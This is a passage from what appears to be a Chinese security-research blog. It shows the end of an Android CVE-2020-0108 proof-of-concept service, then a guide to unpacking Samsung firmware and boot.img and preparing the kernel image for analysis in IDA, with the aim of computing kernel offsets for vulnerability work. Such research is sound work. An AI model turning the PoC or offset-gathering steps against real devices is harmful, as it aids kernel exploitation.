<span class="title class_">UnsupportedOperationException</span>(<span class="string">&quot;Not yet implemented&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">onStartCommand</span><span class="params">(Intent intent, <span class="type">int</span> flags, <span class="type">int</span> startId)</span> &#123;</span><br><span class="line"><span class="comment">//        Handle the exception in main loop</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Handler</span>(Looper.getMainLooper()).post(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        Looper.loop();</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"><span class="comment">//        Create a Notification object with a invalid channel ID</span></span><br><span class="line">        <span class="type">Notification</span> <span class="variable">notification</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NotificationCompat</span>.Builder(<span class="built_in">this</span>, <span class="string">&quot;InvalidInvalidInvalid&quot;</span> <span class="comment">/* A Invalid Channel ID */</span>)</span><br><span class="line">                .setContentTitle(<span class="string">&quot;Testing CVE-2020-0108&quot;</span>)</span><br><span class="line">                .setContentText(<span class="string">&quot;If you see this means you device is not vulnerable&quot;</span>)</span><br><span class="line">                .setWhen(System.currentTimeMillis())</span><br><span class="line">                .setSmallIcon(R.drawable.ic_launcher_foreground)</span><br><span class="line">                .setLargeIcon(BitmapFactory.decodeResource(getResources(), R.drawable.ic_launcher_foreground))</span><br><span class="line">                .build();</span><br><span class="line">        startForeground(<span class="number">2</span>, notification);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">MyRunnable</span>()).start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.onStartCommand(intent, flags, startId);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyRunnable</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">15</span>; i++) &#123;</span><br><span class="line">                Log.e(<span class="string">&quot;postNotification&quot;</span>,<span class="string">&quot;Run Count: &quot;</span> + i);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-06-23T12:48:38.000Z" title="2022/6/23 20:48:38">2022-06-23</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-06-23T14:09:18.888Z" title="2022/6/23 22:09:18">2022-06-23</time></span><span class="level-item">22 minutes read (About 3326 words)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/06/23/Android%E5%86%85%E6%A0%B8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">Android内核信息收集</a></p><div class="content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在验证Android内核漏洞时，涉及到算内核函数或数据结构偏移的问题，发现没有这方面的知识储备，于是准备收集整理记录这方面的知识。</p>
<h2 id="三星固件包"><a href="#三星固件包" class="headerlink" title="三星固件包"></a>三星固件包</h2><p>解压了一个三星的固件包中的<code>AP_G9730ZCU5FUC2_CL21058543_QB38745533_REV00_user_low_ship_MULTI_CERT_meta_OS11.tar.md5</code></p>
<blockquote>
<p><code>.tar.md5</code>指的是压缩已验证，TAR文件包含固件和其他系统数据，而<code>.MD5</code> 扩展程序验证没有数据损坏，这是三星的格式</p>
<p>直接将 <code>.tar.md5</code> 重命名为 <code>.tar</code>，然后再用 Odin 刷入，就不会校验了，不管这个线刷包有没有做 <code>.tar.md5</code> 的步骤。</p>
</blockquote>
<p>然后得到了以下文件：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">d-----                meta-data</span><br><span class="line">-a----       23656325 boot.img.lz4</span><br><span class="line">-a----           1292 dqmdbg.img.ext4.lz4</span><br><span class="line">-a----         953562 dtbo.img.lz4</span><br><span class="line">-a----           1923 persist.img.ext4.lz4</span><br><span class="line">-a----       37936471 recovery.img.lz4</span><br><span class="line">-a----     3299056890 system.img.ext4.lz4</span><br><span class="line">-a----     2190845341 userdata.img.ext4.lz4</span><br><span class="line">-a----           3447 vbmeta.img.lz4</span><br><span class="line">-a----      812012780 vendor.img.ext4.lz4</span><br></pre></td></tr></table></figure>

<h3 id="vbmeta镜像的作用"><a href="#vbmeta镜像的作用" class="headerlink" title="vbmeta镜像的作用"></a>vbmeta镜像的作用</h3><p>验证启动（<code>Verified Boot</code>）是Android一个重要的安全功能，主要是为了访问启动镜像被篡改，提高系统的抗攻击能力，简单描述做法就是在启动过程中增加一条校验链，即 <code>ROM code</code> 校验 <code>BootLoader</code>，确保 <code>BootLoader</code> 的合法性和完整性，<code>BootLoader</code> 则需要校验 <code>boot image</code>，确保 <code>Kernel</code> 启动所需 <code>image</code> 的合法性和完整性，而 <code>Kernel</code> 则负责校验 <code>System</code> 分区和 <code>vendor</code> 分区。</p>
<p>由于 <code>ROM code</code> 和 <code>BootLoader</code> 通常都是由设备厂商 OEM 提供，而各家实际做法和研发能力不尽相同，为了让设备厂商更方便的引入 Verified boot 功能，Google 在 Android O上推出了一个统一的验证启动框架 <code>Android verified boot 2.0</code>，好处是既保证了基于该框架开发的<code>verified boot</code> 功能能够满足 CDD 要求，也保留了各家 OEM 定制启动校验流程的弹性。</p>
<p>由于 <code>ROM code</code> 校验 <code>BootLoader</code>  的功能通常与 IC的设计相关，所以 AVB 2.0 关注的重点在 <code>BootLoader</code>  之后的校验流程。<code>BootLoader</code>  之后系统启动所涉及的关键镜像通常包括 <code>boot.img</code>，<code>system.img</code>，Android O 的 <code>treble Project</code> 还引入了 <code>dtbo </code>和 <code>vendor.img</code>。这些 <code>image</code> 挨个校验可以说费时费力，而 AVB 2.0 的做法事实上十分简单，引入一个新的分区：<code>vbmeta.img</code>（<code>verified boot metadata</code>），然后把所有需要校验的内容在编译时就计算好打包到这个分区，那么启动过程中 <code>BootLoader</code> 只需要校验 <code>vbmeta.img</code>，就能确认 <code>vbmeta</code> 内的数据是否可信。再用 <code>vbmeta</code> 中的数据去比对 <code>bootimg</code>，<code>dtbo</code>，<code>system.img</code>，<code>vendor.img</code> 即可。至于 OEM 是还需要放什么其他东西到 <code>vbmeta</code> 中，则可以由 OEM 自由定制，可以说保留了很好的客制化空间。</p>
<p>除了最基本的验证启动之外，AVB 2.0 还提供防止回滚的功能和对AB分区备份的支持，具体的可以看README文档（安卓源码<code>external/avb/README.md</code>）。</p>
<h3 id="dtbo镜像"><a href="#dtbo镜像" class="headerlink" title="dtbo镜像"></a>dtbo镜像</h3><p>设备树 (DT) 是用于描述“不可发现”硬件的命名节点和属性构成的一种数据结构。操作系统（例如在 Android 中使用的 Linux 内核）会使用 DT 来支持 Android 设备使用的各种硬件配置。硬件供应商会提供自己的 DT 源文件，接下来 Linux 会将这些文件编译到引导加载程序使用的设备树 <code>Blob (DTB)</code> 文件中。</p>
<p>参考官方文档<a target="_blank" rel="noopener" href="https://source.android.com/devices/architecture/dto">设备树叠加层</a>。</p>
<h1 id="System-镜像介绍"><a href="#System-镜像介绍" class="headerlink" title="System 镜像介绍"></a>System 镜像介绍</h1><p>System 镜像一般有两种格式，一种为 <code>ext4 image</code>，一种为 <code>sparse image</code>。</p>
<p>线刷包中的 <code>system image</code>，采用的是 <code>sparse image</code> 格式，而刷入完成直接采用 <code>dd</code> 或 <code>cat</code> 命令备份出来，则是 <code>ext4</code> 格式。</p>
<h1 id="Android内核配置提取"><a href="#Android内核配置提取" class="headerlink" title="Android内核配置提取"></a>Android内核配置提取</h1><p><code>/proc/config.gz</code></p>
<h1 id="CPU信息"><a href="#CPU信息" class="headerlink" title="CPU信息"></a>CPU信息</h1><p><code>/sys/devices/system/cpu/</code></p>
<p><code>cat /sys/devices/system/cpu/cpu7/cpufreq/cpuinfo_max_freq</code></p>
<h1 id="android系统的分区"><a href="#android系统的分区" class="headerlink" title="android系统的分区"></a>android系统的分区</h1><p>比较重要的几个分区如下：</p>
<p>1、<code>/boot</code>分区：该分区主要包含<code>android kernel</code>镜像和<code>ramdisk</code>（一种将RAM模拟为硬盘的技术，提高访问速度）。</p>
<p>2、<code>/system</code>分区：该分区主要存放<code>Android</code>框架及其相关配置，包含系统预装的<code>app</code>。</p>
<p>3、<code>/recovery</code>分区：该分区主要是备份的分区</p>
<p>4、<code>/data</code> 用户数据的存储区域</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/data/app/com.xxxx/           以包名存放应用安装文件，包括base.apk </span><br><span class="line">/lib/data/data/com.xxxx/      存放应用数据，包括sp、db等</span><br><span class="line">/data/dalvik-cache            以包名存放优化过的应用dex文件</span><br></pre></td></tr></table></figure>

<p>5、<code>/cache</code>分区：Android系统缓存区域，保存系统最常访问的数据和应用程序。</p>
<p>6、<code>/misc</code>分区：此分区包含一些系统功能设置开关和数据，比如USB设置。</p>
<p>7、<code>/sdcard</code>分区：外置存储分区</p>
<p>8、<code>/vendor</code>分区：厂商定制的分区，厂商的某些系统升级可以通过这个分区来实现。</p>
<h1 id="boot-img"><a href="#boot-img" class="headerlink" title="boot.img"></a>boot.img</h1><p><code>boot.img</code>就是<code>android</code>系统的<code>Linux</code>内核主要的镜像文件，在该文件中大致包含<code>boot header</code>，<code>kernel</code>，<code>ramdisk</code>。</p>
<p><code>boot.img</code>文件跳过<code>2K</code>的文件头之后，包含两个<code>gz</code>压缩包，一个是<code>boot.img-kernel.gz Linux</code>内核，一个是<code>boot.img-ramdisk.cpio.gz</code>，然后加上<code>ramdisk</code>文件。<code>boot.img</code>文件在针对<code>kernel</code>是有不同压缩算法来进行压缩的。</p>
<p>大致的结构图如下</p>
<p><img src="https://bbs.pediy.com/upload/attach/202103/849527_BB97KK7ZN7U8ZXD.png"></p>
<h2 id="ADB提取boot镜像"><a href="#ADB提取boot镜像" class="headerlink" title="ADB提取boot镜像"></a>ADB提取boot镜像</h2><p>从手机中提取需要用到<code>root</code>权限，这对实际漏洞来讲有些苛刻。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=/dev/block/by-name/boot of=/sdcard/boot.img</span><br></pre></td></tr></table></figure>

<p>然后使用 ADB 拖到电脑备用.</p>
<h2 id="binwalk解包"><a href="#binwalk解包" class="headerlink" title="binwalk解包"></a>binwalk解包</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"> » python3 /usr/local/lib/python3.8/dist-packages/binwalk-2.3.3-py3.8.egg/binwalk boot.img</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             Android bootimg, kernel size: 50209697 bytes, kernel addr: 0x8000, ramdisk size: 0 bytes, ramdisk addr: 0x0, product name: <span class="string">&quot;RILRI20B005&quot;</span></span><br><span class="line">169252        0x29524         SHA256 <span class="built_in">hash</span> constants, little endian</span><br><span class="line">185108        0x2D314         SHA256 <span class="built_in">hash</span> constants, little endian</span><br><span class="line">188820        0x2E194         AES Inverse S-Box</span><br><span class="line">16556401      0xFCA171        Certificate <span class="keyword">in</span> DER format (x509 v3), header length: 4, sequence length: 21129</span><br><span class="line">24670228      0x1787014       ELF, 64-bit LSB shared object, version 1 (SYSV)</span><br><span class="line">24693124      0x178C984       gzip compressed data, maximum compression, from Unix, last modified: 1970-01-01 00:00:00 (null <span class="built_in">date</span>)</span><br><span class="line">25614492      0x186D89C       Compiled Java class data, version 0.0</span><br><span class="line">25621020      0x186F21C       Compiled Java class data, version 0.0</span><br><span class="line">25644484      0x1874DC4       Compiled Java class data, version 0.0</span><br><span class="line">25651012      0x1876744       Compiled Java class data, version 0.0</span><br><span class="line">25876272      0x18AD730       Zlib compressed data, compressed</span><br><span class="line">25877304      0x18ADB38       Zlib compressed data, compressed</span><br><span class="line">25877824      0x18ADD40       Zlib compressed data, default compression</span><br><span class="line">25878856      0x18AE148       Zlib compressed data, default compression</span><br><span class="line">25895274      0x18B216A       Private key <span class="keyword">in</span> DER format (PKCS header length: 4, sequence length: 799</span><br><span class="line">25972564      0x18C4F54       DES SP2, little endian</span><br><span class="line">25973076      0x18C5154       DES SP1, little endian</span><br><span class="line">25987348      0x18C8914       CRC32 polynomial table, little endian</span><br><span class="line">26020915      0x18D0C33       HTML document header</span><br><span class="line">26021215      0x18D0D5F       HTML document footer</span><br><span class="line">26693504      0x1974F80       CRC32 polynomial table, little endian</span><br><span class="line">27586276      0x1A4EEE4       ELF, 64-bit LSB shared object, version 1 (GNU/Linux)</span><br><span class="line">27587596      0x1A4F40C       Certificate <span class="keyword">in</span> DER format (x509 v3), header length: 4, sequence length: 1087</span><br><span class="line">27588687      0x1A4F84F       Certificate <span class="keyword">in</span> DER format (x509 v3), header length: 4, sequence length: 1169</span><br><span class="line">27589860      0x1A4FCE4       Certificate <span class="keyword">in</span> DER format (x509 v3), header length: 4, sequence length: 1161</span><br><span class="line">27593748      0x1A50C14       ELF, 64-bit LSB shared object, version 1 (GNU/Linux)</span><br><span class="line">27595068      0x1A5113C       Certificate <span class="keyword">in</span> DER format (x509 v3), header length: 4, sequence length: 1087</span><br><span class="line">27596159      0x1A5157F       Certificate <span class="keyword">in</span> DER format (x509 v3), header length: 4, sequence length: 1169</span><br><span class="line">27597332      0x1A51A14       Certificate <span class="keyword">in</span> DER format (x509 v3), header length: 4, sequence length: 1161</span><br><span class="line">27987715      0x1AB0F03       Base64 standard index table</span><br><span class="line">28041856      0x1ABE280       SHA256 <span class="built_in">hash</span> constants, little endian</span><br><span class="line">28051156      0x1AC06D4       AES Inverse S-Box</span><br><span class="line">33382378      0x1FD5FEA       Unix path: /home/dpi/qb5_8814/workspace/P4_1716/android/kernel/msm-4.14/arch/arm64/kernel/entry.S</span><br><span class="line">33941962      0x205E9CA       Unix path: /dev/block/bootdevice/by-name/param</span><br><span class="line">33946482      0x205FB72       Unix path: /dev/block/platform/soc/%s/by-name/debug</span><br><span class="line">34055474      0x207A532       Unix path: /sys/kernel/debug/dri.</span><br><span class="line">34066784      0x207D160       Unix path: /sys/kernel/debug/dri/%pd/%s</span><br><span class="line">34066849      0x207D1A1       Unix path: /sys/kernel/debug/dri/%s</span><br><span class="line">34066988      0x207D22C       Unix path: /sys/kernel/debug/dri.</span><br><span class="line">34318013      0x20BA6BD       Unix path: /sys/kernel/debug/dri/%pd/perf</span><br><span class="line">34431339      0x20D616B       Unix path: /lib/firmware/updates/4.14.190-21058543-abG9730ZCU5FUC2</span><br><span class="line">34435626      0x20D722A       Unix path: /dev/disk/by-partlabel</span><br><span class="line">34536061      0x20EFA7D       Unix path: /sys/kernel/debug/.../reset_controller</span><br><span class="line">34696677      0x2116DE5       Neighborly text, <span class="string">&quot;neighbor reportbr_req&quot;</span></span><br><span class="line">34696768      0x2116E40       Neighborly text, <span class="string">&quot;neighbor reportiled to send neighbor report request, error=%d&quot;</span></span><br><span class="line">34696844      0x2116E8C       Neighborly text, <span class="string">&quot;neighbor report request, error=%d_list&quot;</span></span><br><span class="line">34709707      0x211A0CB       Neighborly text, <span class="string">&quot;Neighbor Report frame with incorrect length %dhbor report (token = %d)&quot;</span></span><br><span class="line">34709766      0x211A106       Neighborly text, <span class="string">&quot;neighbor report (token = %d)nt with length %d&quot;</span></span><br><span class="line">34709808      0x211A130       Neighborly text, <span class="string">&quot;Neighbor Report element with length %dxx:xx:x%x:%02x&quot;</span></span><br><span class="line">34895079      0x21474E7       Base64 standard index table</span><br><span class="line">34948093      0x21543FD       PARity archive data - file number 20549</span><br><span class="line">35031879      0x2168B47       Unix path: /dev/bus/usb/%03d/%03d</span><br><span class="line">35643506      0x21FE072       Copyright string: <span class="string">&quot;Copyright(c) Pierre Ossman&quot;</span></span><br><span class="line">35706231      0x220D577       Unix path: /sys/firmware/devicetree/base</span><br><span class="line">35708171      0x220DD0B       Unix path: /sys/firmware/fdt<span class="string">&#x27;: CRC check failed</span></span><br><span class="line"><span class="string">36119484      0x22723BC       Unix path: /sys/class/sec/hall_ic/hall_detect</span></span><br><span class="line"><span class="string">36144593      0x22785D1       Unix path: /sys/class/lcd/panel/SVC_OCTA</span></span><br><span class="line"><span class="string">36147765      0x2279235       Unix path: /sys/class/lcd/panel/window_type</span></span><br><span class="line"><span class="string">36579849      0x22E2A09       Neighborly text, &quot;neighbor table overflow!s %x&quot;</span></span><br><span class="line"><span class="string">36623432      0x22ED448       Neighborly text, &quot;NeighborSolicitsdev_snmp6&quot;</span></span><br><span class="line"><span class="string">36623449      0x22ED459       Neighborly text, &quot;NeighborAdvertisementsnuse %d&quot;</span></span><br><span class="line"><span class="string">36629463      0x22EEBD7       Neighborly text, &quot;neighbor %.2x%.2x.%pM lostename link %s to %s&quot;</span></span><br><span class="line"><span class="string">36649206      0x22F38F6       Neighborly text, &quot;NeighborhHWMPactivePathTimeout&quot;</span></span><br><span class="line"><span class="string">40332015      0x2676AEF       Certificate in DER format (x509 v3), header length: 4, sequence length: 928</span></span><br><span class="line"><span class="string">40349716      0x267B014       Certificate in DER format (x509 v3), header length: 4, sequence length: 1353</span></span><br><span class="line"><span class="string">40352532      0x267BB14       Certificate in DER format (x509 v3), header length: 4, sequence length: 928</span></span><br><span class="line"><span class="string">40392092      0x268559C       ASCII cpio archive (SVR4 with no CRC), file name: &quot;dev&quot;, file name length: &quot;0x00000004&quot;, file size: &quot;0x00000000&quot;</span></span><br><span class="line"><span class="string">40392208      0x2685610       ASCII cpio archive (SVR4 with no CRC), file name: &quot;dev/console&quot;, file name length: &quot;0x0000000C&quot;, file size: &quot;0x00000000&quot;</span></span><br><span class="line"><span class="string">40392332      0x268568C       ASCII cpio archive (SVR4 with no CRC), file name: &quot;root&quot;, file name length: &quot;0x00000005&quot;, file size: &quot;0x00000000&quot;</span></span><br><span class="line"><span class="string">40392448      0x2685700       ASCII cpio archive (SVR4 with no CRC), file name: &quot;TRAILER!!!&quot;, file name length: &quot;0x0000000B&quot;, file size: &quot;0x00000000&quot;</span></span><br><span class="line"><span class="string">45887996      0x2BC31FC       Unix path: /sys/power/cpufreq_max_limit 1497600</span></span><br><span class="line"><span class="string">45888040      0x2BC3228       Unix path: /sys/power/cpufreq_max_limit -1</span></span><br><span class="line"><span class="string">46123652      0x2BFCA84       LZMA compressed data, properties: 0xC8, dictionary size: 536870912 bytes, uncompressed size: 78 bytes</span></span><br><span class="line"><span class="string">48199859      0x2DF78B3       Intel x86 or x64 microcode, pf_mask 0x8000, 2000-01-20, size 18882560</span></span><br><span class="line"><span class="string">49215524      0x2EEF824       Flattened device tree, size: 500187 bytes, version: 17</span></span><br><span class="line"><span class="string">49715711      0x2F699FF       Flattened device tree, size: 497909 bytes, version: 17</span></span><br><span class="line"><span class="string">50213620      0x2FE32F4       Flattened device tree, size: 173 bytes, version: 17</span></span><br></pre></td></tr></table></figure>

<p>博客上说的内核地址并没有，可能是三星的魔改太多：</p>
<p><img src="https://bbs.pediy.com/upload/attach/202103/849527_FZZ32HHFFGUYUG2.png"></p>
<p>可以用<code>binwalk -e</code>提取，但是效果差点。</p>
<h2 id="unpackbootimg解包"><a href="#unpackbootimg解包" class="headerlink" title="unpackbootimg解包"></a>unpackbootimg解包</h2><p>可以用这个<a target="_blank" rel="noopener" href="https://github.com/anestisb/android-unpackbootimg%E6%88%96https://github.com/osm0sis/mkbootimg%E6%8F%90%E5%8F%96%EF%BC%8C%E8%BF%98%E6%9C%89%60imgtool%60%E6%8F%90%E5%8F%96%E3%80%82">https://github.com/anestisb/android-unpackbootimg或https://github.com/osm0sis/mkbootimg提取，还有`imgtool`提取。</a></p>
<p>提取出来的结果：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">➜ ./unpackbootimg -i boot.img -o boot-out</span><br><span class="line">ANDROID! magic found at: 0</span><br><span class="line">BOARD_KERNEL_CMDLINE console=null androidboot.hardware=qcom androidboot.console=ttyMSM0 androidboot.memcg=1 lpm_levels.sleep_disabled=1 video=vfb:640x400,bpp=32,memsize=3072000 msm_rtb.filter=0x237 service_locator.enable=1 swiotlb=2048 androidboot.usbcontroller=a600000.dwc3 firmware_class.path=/vendor/firmware_mnt/image</span><br><span class="line">BOARD_KERNEL_BASE 0x00000000</span><br><span class="line">BOARD_NAME RILRI20B005</span><br><span class="line">BOARD_PAGE_SIZE 4096</span><br><span class="line">BOARD_HASH_TYPE sha1</span><br><span class="line">BOARD_KERNEL_OFFSET 0x00008000</span><br><span class="line">BOARD_RAMDISK_OFFSET 0x00000000</span><br><span class="line">BOARD_SECOND_OFFSET 0x00000000</span><br><span class="line">BOARD_TAGS_OFFSET 0x01e00000</span><br><span class="line">BOARD_OS_VERSION 11.0.0</span><br><span class="line">BOARD_OS_PATCH_LEVEL 2021-03</span><br><span class="line">BOARD_HEADER_VERSION 1</span><br><span class="line">BOARD_HEADER_SIZE 1648</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">➜ <span class="built_in">ls</span> -al</span><br><span class="line">total 98168</span><br><span class="line">drwxr-xr-x  2 DarkMatter  staff       544  6 23 21:16 .</span><br><span class="line">drwx------@ 4 DarkMatter  staff       544  6 23 21:16 ..</span><br><span class="line">-rw-r--r--  1 DarkMatter  staff        11  6 23 21:16 boot.img-base</span><br><span class="line">-rw-r--r--  1 DarkMatter  staff        12  6 23 21:16 boot.img-board</span><br><span class="line">-rw-r--r--  1 DarkMatter  staff       301  6 23 21:16 boot.img-cmdline</span><br><span class="line">-rw-r--r--  1 DarkMatter  staff         5  6 23 21:16 boot.img-hashtype</span><br><span class="line">-rw-r--r--  1 DarkMatter  staff         3  6 23 21:16 boot.img-header_version</span><br><span class="line">-rw-r--r--  1 DarkMatter  staff  50209697  6 23 21:16 boot.img-kernel</span><br><span class="line">-rw-r--r--  1 DarkMatter  staff        11  6 23 21:16 boot.img-kernel_offset</span><br><span class="line">-rw-r--r--  1 DarkMatter  staff         8  6 23 21:16 boot.img-os_patch_level</span><br><span class="line">-rw-r--r--  1 DarkMatter  staff         7  6 23 21:16 boot.img-os_version</span><br><span class="line">-rw-r--r--  1 DarkMatter  staff         5  6 23 21:16 boot.img-pagesize</span><br><span class="line">-rw-r--r--  1 DarkMatter  staff         0  6 23 21:16 boot.img-ramdisk</span><br><span class="line">-rw-r--r--  1 DarkMatter  staff        11  6 23 21:16 boot.img-ramdisk_offset</span><br><span class="line">-rw-r--r--  1 DarkMatter  staff        11  6 23 21:16 boot.img-second_offset</span><br><span class="line">-rw-r--r--  1 DarkMatter  staff        11  6 23 21:16 boot.img-tags_offset</span><br></pre></td></tr></table></figure>

<p>这里<code>boot.img-kernel</code>显示是未压缩的镜像：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜ hexdump -C -n 32 boot.img-kernel</span><br><span class="line">00000000  55 4e 43 4f 4d 50 52 45  53 53 45 44 5f 49 4d 47  |UNCOMPRESSED_IMG|</span><br><span class="line">00000010  10 e8 ee 02 00 00 96 14  00 00 00 00 00 00 08 00  |.��.............|</span><br><span class="line">00000020</span><br></pre></td></tr></table></figure>

<h2 id="imjtool解包-没测试"><a href="#imjtool解包-没测试" class="headerlink" title="imjtool解包(没测试)"></a>imjtool解包(没测试)</h2><p>这里使用<a target="_blank" rel="noopener" href="http://newandroidbook.com/tools/imjtool.html">imjtool</a>工具：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./imjtool &lt;path to boot.img&gt; extract</span><br></pre></td></tr></table></figure>

<p>解包后的文件将被放在<code>./extracted</code>目录, 分别有<code>kernel</code>(内核image), <code>kernelimage</code>(内核defconfig), <code>ramdisk</code>(ramdisk包, 通常是<code>cpio</code>格式)</p>
<h2 id="预处理Image"><a href="#预处理Image" class="headerlink" title="预处理Image"></a>预处理Image</h2><p>这里我们选择<a target="_blank" rel="noopener" href="https://github.com/nforest/droidimg">droidimg</a>来配合<code>IDA Pro</code>完成这个任务。</p>
<p><strong>跳过头部标识</strong></p>
<p><code>Linux</code>内核在生成的时候有时会在头部添加一些<a target="_blank" rel="noopener" href="https://github.com/wloot/raphael/blob/43be2402d4fa363ac6eb89431d4f49ce4d189c42/arch/arm64/boot/Makefile#L51">信息</a>, 以供<code>fastboot</code>读取. 一般来说分别是, 16字节的<code>UNCOMPRESSED_IMG</code>和4字节的大小信息。</p>
<p><strong>验证</strong></p>
<p>这里先直接使用<code>IDA Pro</code>打开未经处理的Image, 处理器类型记得选择<code>ARM Little-endian</code>(不用纠结, Android设备全是<code>Little-endian</code>), 一路确定就行。</p>
<p>切换到16进制查看器页面, 可以很清楚的看到头部有<code>UNCOMPRESSED_IMG</code>标识。</p>
<p><strong>处理</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=&lt;path to origin image&gt; of=&lt;path to patched image&gt; bs=1 skip=20</span><br></pre></td></tr></table></figure>

<p><strong>对启用kaslr的内核进行额外处理</strong></p>
<p><strong>验证</strong></p>
<p>还记得刚刚拿到的<code>kernelimage</code>不, 打开他. 搜索<code>CONFIG_RANDOMIZE_BASE=y</code>, 如果有匹配内容说明就需要进行下一步处理了</p>
<p><strong>处理</strong></p>
